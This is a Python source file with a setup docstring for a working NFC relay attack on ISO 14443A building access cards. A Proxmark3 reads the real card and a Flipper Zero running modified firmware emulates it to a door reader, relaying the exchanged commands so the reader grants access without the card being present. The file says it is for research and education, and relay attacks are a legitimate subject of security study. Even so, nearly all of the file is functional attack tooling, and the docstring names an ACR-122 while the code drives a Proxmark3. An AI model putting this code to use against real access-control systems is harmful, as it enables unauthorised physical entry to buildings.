### relay.py
'''
DISCLAIMER : This program was created for research and educational purposes only with 
    no warranty whatsoever.

Copyright (C) 2026 Solal TESSIER

Part of this code was inspired by Guillaume VINET (gvinet)'s 
example code for his python lib pynfcreader : examples/emu_flipper_zero_iso14443_a_relay.py

    Copyright (C) 2015-2024 Guillaume VINET
    Licensed under the Apache License, Version 2.0 (the "License");
    you may not use this file except in compliance with the License.
    You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

    Unless required by applicable law or agreed to in writing, software
    distributed under the License is distributed on an "AS IS" BASIS,
    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
    See the License for the specific language governing permissions and
    limitations under the License.


Using the pyscard (smartcard) module, the goal is to simulate a NFC relay attack between
    a legitimate reader and a legitimate access card to grant access to a building
    without the access card being physically close to the reader using
    an ACR-122 and a FlipperZero with modded firmware by gvinet on GitHub. To run this,
    you will also need to download and compile the libnfc library.
I have forked gvinet's repo to add a few upgrades
    (https://github.com/Panostop/flipperzero-firmware-relay).



To set up the Flipper :
    - Plug it into the Raspberry Pi
    - run : 
        $ git clone "https://github.com/Panostop/flipperzero-firmware-relay.git" 
        $ cd flipperzero-firmware-relay

        # the following script can be used each time you need it, it cleans, compiles and flashes the flipper
        $ ./flasher

    - wait for the build and installation to finish on the Flipper (can take a while)

The ACR122 is not used twice because of restrictions in emulation mode.

For this program to work, you will need to call it with root privileges because of
    the pyscard module. To do so, if you use pyenv and because of pyenv shims, call 
    
    $ sudo $(which python) relay.py
    
    to avoid sudo using its own python environment


This is the physical setup expected (the Access Card must be placed before start):

    [Access Card].))  ((.[ACR-122U]---[RasPi]---[FlipperZero].))  ((.[Reader]

'''


import serial, pexpect
from typing import Tuple

from pynfcreader.sessions.iso14443.tpdu import Tpdu
from pynfcreader.devices import flipper_zero
from pynfcreader.sessions.iso14443.iso14443a import Iso14443ASession


class Proxmark3Reader():
    def __init__(self,):
        self.terminal = pexpect.spawn('pm3', encoding='utf-8') #initialize communication with the proxmark
        self.terminal.expect_exact("pm3 -->")#wait for first prompt
        self.communication_initiated = False


    def getCardInfo(self) -> Tuple[list[str], bool]:
        # PM3 acts as a reader and launches anticollision procedure to select a card
        self.terminal.sendline("hf 14a reader")
        self.terminal.readline()
        self.terminal.expect_exact("pm3 -->") # wait until next prompt
        has_ATS = False

        #formatter
        # -- original format (ATS line not always present and the '+' and 'X's are green) :

        #   [+]  UID: XX XX XX XX ...
        #   [+] ATQA: XX XX
        #   [+]  SAK: XX ...[X]
        #   [+]  ATS: XX XX XX XX ...
        #
        #   [usb] # this line is present because of the prompt searching string 'pm3 -->'
        
        # The following oneliner takes the buffer,            | self.terminal.before
        #   splits it for every line,                         | .split("\r\n")
        #   keeps all but the last two                        | [:-2]
        #   and creates a list (card_data).                   | card_data = [
        #   for every line left,                              | i
        #   it keeps only what is after the two dots (:),     | .split(': ')[1]
        #   and deletes the ANSI color formattings and spaces | .replace(' ', '').replace('\x1b[32m', '').replace('\x1b[0m','')
        
        #ILOVEONELINERSFROMHELL
        card_data = [i.split(': ')[1].replace(' ', '').replace('\x1b[32m', '').replace('\x1b[0m','') for i in self.terminal.before.split("\r\n")[:-2]]
        
        
        has_ATS =  len(card_data) == 4
        
        return card_data, has_ATS

    def auto_search(self) -> str:
        for port in serial.tools.list_ports.comports():
            if "PM3" in port.description or "proxmark3" in port.description:
                return port.device
        #not found :
        print("Error. No proxmark3 device found")
        exit(1)

    def process_apdu(self, raw_bytes:str, add_crc:bool) -> Tuple[list[str] | None, bool]:
        answer_has_crc= False
        options_string=[]

        if not self.communication_initiated:
            options_string.append("s") # proxmark option to select the card, use only once
            self.communication_initiated = True
        elif add_crc:
            options_string.append("c") # proxmark option to automatically calculate and add CRC

        #proxmark command for raw data, option -k means keep card selected after receiving answer
        self.terminal.sendline(f"hf 14a raw -k{options_string} {raw_bytes}") 
        self.terminal.expect_exact("pm3 -->") #wait until new prompt

        
        try:
            #formatter
            # -- original format [ XX XX ] represents the CRC, not always present and to isolate :

            #   [+]  XX XX XX XX XX ... [ XX XX ]
            #   [usb] # this line is present because of the prompt-searching string 'pm3 -->'
            
            # The following oneliner takes the buffer,            | self.terminal.before
            #   splits it for every line,                         | .split("\r\n")
            #   keeps only the first line and on this line,       | [0]
            #   it keeps only what is after the plus sign ([+]),  | .split('[\x1b[32m+\x1b[0m] ')[1]  #wierd looking because of color codes
            #   and deletes the ANSI color formattings and spaces | .replace(' ', '').replace('\x1b[32m', '').replace('\x1b[31m', '').replace('\x1b[0m','')
            #   Then, it splits into two parts : APDU and CRC     | .split('[')               \  GREEN  /             \   RED   /             \ WHITE /
            
            #ILOVEONELINERSFROMHELL
            data = self.terminal.before.split('\r\n')[0].split('[\x1b[32m+\x1b[0m] ')[1].replace(' ', '').replace('\x1b[32m', '').replace('\x1b[31m', '').replace('\x1b[0m','').split('[')
            data[-1] = data[-1].replace(']', '') #remove any trailing bracket on the last item, with or without CRC
            answer_has_crc = len(data)==2 # True if there are 2 items, AKA CRC present
        except:
            #we should get here if we dont get any data back from the card
            data=None
        
        
        return data, answer_has_crc

    def close(self):
        self.terminal.close()


class Emu(Iso14443ASession):
    def __init__(self, cid=0, nad=0, drv=None, block_size=16, reader=None):
        Iso14443ASession.__init__(self, cid, nad, drv, block_size)
        self._addCID = False
        self.drv = self._drv
        self._pcb_block_number: int = 1
        # Set to one for an ICC
        self._iblock_pcb_number = 1
        self.iblock_resp_lst = []

        self.reader = reader
        if not self.reader:
            print("No reader initialized for this emulator")
            exit(7143)
        else:
            self.ATS = self.setCardInfo()
            

    def run(self):
        self.drv.start_emulation()
        print("...go!")
        self.low_level_dispatcher()

    def setCardInfo(self) -> str | None:
        
        card_data, has_ATS = self.reader.getCardInfo()

        print(f"This card will be emulated :",
              f"- UID  : {card_data[0]}",
              f"- ATQA : {card_data[1]}",
              f"- SAK  : {card_data[2]}",
              sep='\n\t ',
              end='\n'
              )
        
        self.drv.set_uid(card_data[0])
        self.drv.set_atqa(card_data[1])
        self.drv.set_sak(card_data[2])

        return None if not has_ATS else card_data[3]

    def process_apdu(self, apdu:str, add_crc:bool) -> Tuple[list[str] | None, bool]:
        return self.reader.process_apdu(apdu, add_crc)
    
    def rblock_process(self, tpdu: Tpdu) -> Tuple[str, bool]:
        print("r block")
        if tpdu.tpdu == b"\xBA\x00\xBE\xD9": #rare case observed, might not be useful for you
            rtpdu, crc = "BA00", True
        
        elif tpdu.tpdu == b"\xBB\x00\x66\xC0": #rare case observed, might not be useful for you
            rtpdu, crc = "BB00", True

        elif tpdu.pcb in [0xA2, 0xA3, 0xB2, 0xB3]:
            if len(self.iblock_resp_lst):
                rtpdu, crc = self.iblock_resp_lst.pop(0).hex(), True
            else:
                rtpdu = self.build_rblock(ack=True).hex()
                crc = True
        else:
            rtpdu, crc = None, False
        

        return rtpdu, crc

    def low_level_dispatcher(self):
        capdu = bytes()
        ats_sent = False

        iblock_resp_lst = []

        while 1:
            received:str = self.drv.emu_get_cmd()
            rtpdu = None
            print(f"tpdu < {received}")

            if received == "off":
                print("field off")

            elif received == "on":
                print("field on")
                ats_sent = False

            else:
                tpdu = Tpdu(bytes.fromhex(received))

                #if it looks like an ATS req, we haven't sent is yet, and we have one :
                if (tpdu.tpdu[0] == 0xE0) and (ats_sent is False) and self.ATS:
                    rtpdu, crc = self.ATS, True 
                    ats_sent = True
                    
                elif tpdu.r:
                    rtpdu, crc = self.rblock_process(tpdu)

                elif tpdu.s:
                    print("s block")
                    # Deselect
                    if len(tpdu._inf_field) == 0:
                        rtpdu, crc = "C2E0B4", False
                    # Otherwise, it is a WTX

                elif tpdu.i:
                    print("i block")
                    capdu += tpdu.inf
                    if tpdu.is_chaining() is False:
                        rapdu = self.process_apdu(capdu)
                        capdu = bytes()
                        self.iblock_resp_lst = self.chaining_iblock(data=rapdu)
                        rtpdu, crc = self.iblock_resp_lst.pop(0).hex(), True
                else:
                    rtpdu, crc = self.process_apdu(received, False) 

                print(f">>> rtdpu {rtpdu}\n")
                if rtpdu == None:
                    self.drv.emu_send_resp(b'\x09') # escape character to stop communication
                    break
                else:
                    self.drv.emu_send_resp(bytes.fromhex(rtpdu), crc)

#initialize the FlipperZero instance and connection
flipper = flipper_zero.FlipperZero("", debug=False)
flipper.connect()
flipper.set_mode_emu_iso14443A()

PM3 = Proxmark3Reader() #initialize the reader and card connection
emu = Emu(drv=flipper, reader=PM3)
emu.run()
